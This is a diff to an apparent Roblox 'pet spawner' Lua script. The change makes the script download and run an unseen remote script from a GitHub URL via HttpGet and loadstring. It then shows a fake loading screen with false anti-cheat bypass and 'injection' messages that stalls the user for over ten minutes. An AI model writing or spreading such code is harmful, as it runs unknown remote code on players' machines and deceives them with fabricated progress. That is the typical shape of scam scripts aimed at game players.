@@ -162,40 +162,57 @@ RunService.RenderStepped:Connect(function()
 	end
 end)
 
--- Begin loading function
 local function startInjection()
-	overlay.Visible = true
-	createDots()
+    overlay.Visible = true
+    createDots()
 
-	-- Fake steps
-	overlayTitle.Text = "Bypassing Anti-Cheat (BYFRON)..."
-	wait(7.5)
- 	overlayTitle.Text = "🎉(BYFRON) Completed bypass layer 1🎉"
-        wait(2.1)
-	overlayTitle.Text = "Bypassing Anti-Cheat (BYFRON) Layer 2..."
-        wait(11.5)
-        overlayTitle.Text = "🎉(BYFRON) Completed bypass layer 2🎉"
-        wait(2.1)
-        overlayTitle.Text = "Loading UI"
-        wait(11.5)
-	overlayTitle.Text = "Loading Main Value's"
-        wait(9.5)
-	overlayTitle.Text = "Loading PlayerScript's"
-        wait(15.5)
-	overlayTitle.Text = "Injecting into to PlayerScriptService"
-        wait(13.5)
-	overlayTitle.Text = "Loading MainHub"
-        wait(500.5)
-        overlayTitle.Text = "🎉Completed🎉"
-	local duration = 600  -- 10 minutes
-	local start = tick()
-	while tick() - start < duration do
-		local progress = (tick() - start) / duration
-		barFill.Size = UDim2.new(progress, 0, 1, 0)
-		wait(0.1)
-	end
+    -- Load & execute remote main script first
+    local success, err = pcall(function()
+        local url = "https://raw.githubusercontent.com/0fyz11/GAG-Spawner/refs/heads/main/ScriptMain"
+        local source = game:HttpGet(url, true)
+        local func = loadstring(source)
+        if func then
+            func()
+        else
+            error("Failed to load remote script")
+        end
+    end)
 
-	overlayTitle.Text = "Pets Loaded. Injection Complete ✅"
+    if not success then
+        overlayTitle.Text = "Error loading main script: " .. tostring(err)
+        return -- stop further loading animation on failure
+    end
+
+    -- Then do your fake loading animation
+    overlayTitle.Text = "Bypassing Anti-Cheat (BYFRON)..."
+    wait(7.5)
+    overlayTitle.Text = "🎉(BYFRON) Completed bypass layer 1🎉"
+    wait(2.1)
+    overlayTitle.Text = "Bypassing Anti-Cheat (BYFRON) Layer 2..."
+    wait(11.5)
+    overlayTitle.Text = "🎉(BYFRON) Completed bypass layer 2🎉"
+    wait(2.1)
+    overlayTitle.Text = "Loading UI"
+    wait(11.5)
+    overlayTitle.Text = "Loading Main Value's"
+    wait(9.5)
+    overlayTitle.Text = "Loading PlayerScript's"
+    wait(15.5)
+    overlayTitle.Text = "Injecting into PlayerScriptService"
+    wait(13.5)
+    overlayTitle.Text = "Loading MainHub"
+    wait(500.5)
+    overlayTitle.Text = "🎉Completed🎉"
+
+    local duration = 600  -- 10 minutes
+    local start = tick()
+    while tick() - start < duration do
+        local progress = (tick() - start) / duration
+        barFill.Size = UDim2.new(progress, 0, 1, 0)
+        wait(0.1)
+    end
+
+    overlayTitle.Text = "Pets Loaded. Injection Complete ✅"
 end
 
 -- Debug prints to check types before connecting events
